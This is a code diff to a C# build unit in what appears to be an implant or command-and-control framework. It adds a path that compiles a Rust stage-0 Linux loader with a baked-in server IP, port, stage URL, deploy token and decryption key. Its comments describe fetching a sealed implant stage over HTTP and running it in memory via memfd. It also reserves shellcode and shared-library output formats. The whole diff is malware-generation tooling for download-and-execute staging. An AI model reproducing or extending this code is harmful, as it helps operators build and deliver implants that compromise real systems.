@@ -12,7 +12,10 @@ namespace Rod.BuildPipeline.PayloadBuild;
 /// contract), and compiles a release binary for the requested target
 /// triple. Rust is always native code: the executable formats are synonyms
 /// here (the size posture lives in the crate's release profile -- opt-level,
-/// LTO, strip), and the dll format is refused outright.
+/// LTO, strip); the shared-library and shellcode spellings are contract
+/// slots refused until the toolchain that produces them lands. Loader-tier
+/// requests compile the no_std crate beside the implant instead, baked with
+/// fetch constants rather than a contact profile.
 /// </summary>
 /// <remarks>
 /// The transport and handler trims the .NET unit applies have Rust
@@ -242,16 +245,12 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
 
     public async Task<BuildArtifact> BuildAsync(BuildParams @params, CancellationToken cancellationToken = default)
     {
-        if (@params.Format == ArtifactFormat.Dll)
+        if (@params.Format is ArtifactFormat.Dll or ArtifactFormat.SharedObject or ArtifactFormat.Shellcode)
             throw new InvalidOperationException(
-                "The dll format is retired with the .NET implant; every Rust artifact is a native executable -- use 'exe' or 'aot'.");
+                $"The '{@params.Format.ToString().ToLowerInvariant()}' format is a contract slot the in-tree Rust unit does not produce yet; build 'exe' or 'aot'.");
         if (!Directory.Exists(_rustSourceDir))
             throw new BuildUnitFailureException($"Rust implant source tree not found at '{_rustSourceDir}'.");
 
-        // The bake: the same base64url profile JSON every unit emits --
-        // one language-neutral contract, decoded identically by every
-        // implant.
-        var baked = ProfileBake.Render(@params);
         var triple = MapTriple(@params.Target);
 
         var workDir = Path.Combine(Path.GetTempPath(), "rod-rust-build-" + Guid.NewGuid().ToString("N"));
@@ -275,6 +274,17 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
         {
             CopyTree(_rustSourceDir, stagingDir);
             CopyProtoTree(_rustSourceDir, workDir);
+
+            // The loader tier branches before the implant bake: its artifact
+            // is the no_std crate beside the implant, baked with fetch
+            // constants rather than a contact profile.
+            if (@params.Kind == PayloadKind.Loader)
+                return await BuildLoaderAsync(@params, triple, stagingDir, targetDir, cancellationToken);
+
+            // The bake: the same base64url profile JSON every unit emits --
+            // one language-neutral contract, decoded identically by every
+            // implant.
+            var baked = ProfileBake.Render(@params);
 
             // Overwrite the checked-in baked.rs stub with the per-build
             // profile, the same mechanism the .NET trees' BakedProfile uses.
@@ -351,6 +361,123 @@ public sealed class RustBuildUnit : IBuildUnit, IBuildUnitEnvironment
             try { Directory.Delete(workDir, recursive: true); }
             catch { /* best-effort; temp dir is disposable */ }
         }
+    }
+
+    // The loader tier's build: bakes the fetch constants into the no_std
+    // crate beside the implant and compiles rod-loader for the target. The
+    // artifact id is minted here, before cargo runs, because the fetch path
+    // the loader bakes names it -- the recorded payload id and the baked
+    // route must be the same guid by construction. The seal key pair rides
+    // the params exactly as the envelope pair does on an implant build (the
+    // endpoint minted it unconditionally for this kind); a request that
+    // reaches this depth without one is a contract violation, refused
+    // rather than baked as a loader that can never open its stage.
+    private async Task<BuildArtifact> BuildLoaderAsync(
+        BuildParams @params,
+        string triple,
+        string stagingDir,
+        string targetDir,
+        CancellationToken cancellationToken)
+    {
+        if (!triple.Contains("-linux-", StringComparison.Ordinal))
+            throw new InvalidOperationException(
+                "The stage-0 loader is a Linux memfd shape; build it against a linux target.");
+        if (@params.TokenSecret is not { } token)
+            throw new InvalidOperationException(
+                "A loader build bakes a deploy token; the transport layer must mint one.");
+        if (@params.EnvelopeKeyId is not { } keyId || @params.EnvelopeKey is not { } key)
+            throw new InvalidOperationException(
+                "A loader build's stage seal key must ride the build params (minted beside the token).");
+        if (@params.StagePayloadId is null)
+            throw new InvalidOperationException(
+                "A loader build names the stored payload it delivers.");
+        var (host, port) = ParseLoaderDial(@params.Transport.Endpoint);
+
+        // The bake: plain consts, the loader crate's whole contract. The
+        // fetch path names this artifact's own id -- the stage route serves
+        // the stage sealed under the key above to the loader that bakes it.
+        var artifactId = Guid.NewGuid();
+        var baked =
+            "// <auto-generated> Generated by Rod.RustBuildUnit at build time.\n"
+            + "// The loader's fetch constants: the dial, the credential, and the\n"
+            + "// stage seal (architecture.md Sec 6, the staging half).\n"
+            + "pub const HOST: [u8; 4] = [" + string.Join(", ", host.Select(b => b.ToString())) + "];\n"
+            + $"pub const PORT: u16 = {port};\n"
+            + $"pub const PATH: &str = \"/implants/stages/{artifactId:N}\";\n"
+            + $"pub const TOKEN: &str = \"{token}\";\n"
+            + "pub const KEY_ID: [u8; 16] = ["
+            + string.Join(", ", keyId.ToByteArray().Select(b => b.ToString())) + "];\n"
+            + "pub const KEY: [u8; 32] = [" + string.Join(", ", key.Select(b => b.ToString())) + "];\n";
+        var loaderDir = Path.Combine(stagingDir, "loader");
+        if (!Directory.Exists(loaderDir))
+            throw new BuildUnitFailureException(
+                $"The loader crate was not found beside the implant at '{loaderDir}'.");
+        await File.WriteAllTextAsync(
+            Path.Combine(loaderDir, "src", "baked.rs"),
+            baked,
+            cancellationToken);
+
+        var arguments = new List<string> { "build", "--release", "--target", triple };
+        var cargo = new ProcessStartInfo
+        {
+            FileName = _cargoBinary,
+            WorkingDirectory = loaderDir,
+            UseShellExecute = false,
+            RedirectStandardError = true,
+            RedirectStandardOutput = true,
+        };
+        foreach (var argument in arguments)
+            cargo.ArgumentList.Add(argument);
+        cargo.Environment["CARGO_TARGET_DIR"] = targetDir;
+        cargo.Environment["CARGO_NET_GIT_FETCH_WITH_CLI"] = "true";
+        var result = await RunAsync(cargo, cancellationToken);
+        if (result.ExitCode != 0)
+        {
+            var diag = result.Stdout;
+            if (result.Stderr.Length > 0)
+                diag = (diag.Length > 0 ? diag + "\n" : "") + result.Stderr;
+            throw new BuildUnitFailureException(
+                $"cargo build failed for the loader (exit {result.ExitCode}):\n{diag}");
+        }
+
+        var binaryPath = Path.Combine(targetDir, triple, "release", "rod-loader");
+        if (!File.Exists(binaryPath))
+            throw new BuildUnitFailureException(
+                $"cargo reported success but produced no rod-loader for {triple}.");
+
+        var content = await File.ReadAllBytesAsync(binaryPath, cancellationToken);
+        return BuildArtifact.Of(
+            Language,
+            artifactId,
+            @params,
+            content,
+            contentType: "application/octet-stream",
+            builtAt: DateTimeOffset.UtcNow);
+    }
+
+    // The loader's baked dial: the four address bytes and the port of a
+    // cleartext http authority. The parser guarantees the shape; this read
+    // is the unit's own refusal of anything that slipped through (a front
+    // repointed between parse and build, say) rather than a bake of a dial
+    // the loader cannot parse.
+    private static (byte[] Host, int Port) ParseLoaderDial(string endpoint)
+    {
+        var trimmed = endpoint.Trim();
+        if (!trimmed.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
+            throw new InvalidOperationException(
+                $"The loader dials a cleartext http front; '{endpoint}' is not one.");
+        var authority = trimmed[7..].Split('/')[0];
+        var colon = authority.LastIndexOf(':');
+        var host = colon >= 0 ? authority[..colon] : authority;
+        var port = 80;
+        if (colon >= 0 && (!int.TryParse(authority[(colon + 1)..], out port) || port is < 1 or > 65535))
+            throw new InvalidOperationException(
+                $"The loader dial's port must be numeric; '{endpoint}' is not one.");
+        if (!System.Net.IPAddress.TryParse(host, out var parsed)
+            || parsed.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
+            throw new InvalidOperationException(
+                $"The loader dials a literal IPv4; '{host}' is not one.");
+        return (parsed.GetAddressBytes(), port);
     }
 
     // Maps the contract's os/arch pairs onto Rust target triples. Linux is
